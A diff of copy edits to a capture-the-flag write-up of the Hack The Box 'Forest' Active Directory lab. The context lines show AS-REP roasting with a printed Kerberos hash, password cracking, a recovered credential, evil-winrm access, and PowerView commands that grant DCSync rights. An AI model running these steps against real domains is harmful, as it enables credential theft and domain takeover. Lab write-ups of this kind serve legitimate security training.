@@ -84,12 +84,11 @@ OS and Service detection performed. Please report any incorrect results at https
 
 > **Important**: The domain name is `htb.local` not `forest.htb`
 
-- SMB — guest login is not accessible
-- WinRM — valid creds required
+SMB guest login is not accessible, and WinRM requires valid creds.
 
 > ldap - Use ldapsearch for querying LDAP directories and extracting information.
 
-LDAP is commonly used for user authentication, authorization, and storing organizational information. Microsoft's Active Directory is built on LDAP. LDAP directories store information hierarchically in a tree structure.
+LDAP is commonly used for user authentication, authorization, and storing organizational information. Microsoft's Active Directory is built on LDAP, and LDAP directories store information hierarchically in a tree structure.
 
 > https://hackviser.com/tactics/pentesting/services/ldap
 
@@ -228,7 +227,7 @@ objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=htb,DC=lo
 
 # User
 
-"Huge data" — grep extracts just the headings to find something valuable:
+"Huge data" — so grep extracts just the headings to find something valuable:
 
 ```sh
 grep "#" enumall.txt
@@ -250,7 +249,7 @@ $ impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.129.95.210
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:fe3fef08c6ec885f7d71e9aacb3c1855$f6536054f2d121be57d83f991e9142b100be199a2897657ba07f9b09fe519dfc3a98287714b7b4cbb8fd313d4ee51f3acf5709959a920392d6e0eb3b46e2c79e82a07431825d0a42a3780804e0c13b384b1cd2856229dbe406d5d3406fcfcf39f04a41773bd7065774f02dba2cbaaed99b1c3cf18f0d60fffd731d98e189936e23071f260f643b4a3ecb7c09f49e8bfedbb2b040493d8be2e7355e34e695bc5eedac49cdfd7792449e757d9dee7f7571142be2a712823163c5daf221179a4d2dee905ad2ed25f1f73327ab01117a7342ea8d7cb538e4b4a0ab5a2c1c5b02edfdc33d8097dfc6
 ```
 
-A **krb5asrep** (Kerberos authentication response hash) — cracked with `john`:
+A **krb5asrep** (Kerberos authentication response hash), cracked with `john`:
 
 ```sh
 $ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt krb-hash
@@ -258,11 +257,11 @@ $ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt krb-hash
 
 > `svc-alfresco : s3rvice`
 
-Gained shell using evil-winrm.
+Gained a shell using evil-winrm.
 
 # Root
 
-SharpHound "latest version 2.14.0 is incompatible" —
+SharpHound errors out with "latest version 2.14.0 is incompatible":
 
 ```html
  <!-- due to outdated .net version on the target --> 
@@ -283,11 +282,7 @@ Upload the zip to BloodHound and select the shortest paths to high value targets
 
 ## Attack path
 
-The path to the domain controller:
-
-- The user can add, delete, modify (**GenericAll**) accounts of the **Exchange Windows Permissions** group — as a member of **Account Operators**, also a member of **Privileged IT Accounts**
-- The user holds privilege over **Remote Management Users** through membership of **Privileged IT Accounts**
-- The **Exchange Windows Permissions** group has **writeDACL** over the Domain
+The path to the domain controller: as a member of **Account Operators** and **Privileged IT Accounts**, the user can add, delete, and modify (**GenericAll**) accounts of the **Exchange Windows Permissions** group, and holds privilege over **Remote Management Users** through that same membership. The **Exchange Windows Permissions** group has **writeDACL** over the Domain.
 
 > The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL
 >
@@ -319,7 +314,7 @@ The command completed successfully.
 The command completed successfully.
 ```
 
-- Successfully added a new user with all permissions
+Successfully added a new user with all the permissions needed.
 
 To abuse WriteDacl on a domain object, grant yourself DCSync permissions.
 
@@ -348,7 +343,7 @@ Upload PowerView to execute:
 *Evil-WinRM* PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('htb\john', $SecPassword)
 ```
 
-- Targeting the **Object**, not the **DomainObject** — using **Principal Identity** for the user instead of **TargetIdentity**, which targets the domain
+Target the **Object**, not the **DomainObject** — use **Principal Identity** for the user instead of **TargetIdentity**, which targets the domain:
 
 ```powershell
 *Evil-WinRM* PS C:\> Add-ObjectAcl -Credential $Cred -PrincipalIdentity john -Rights DCSync
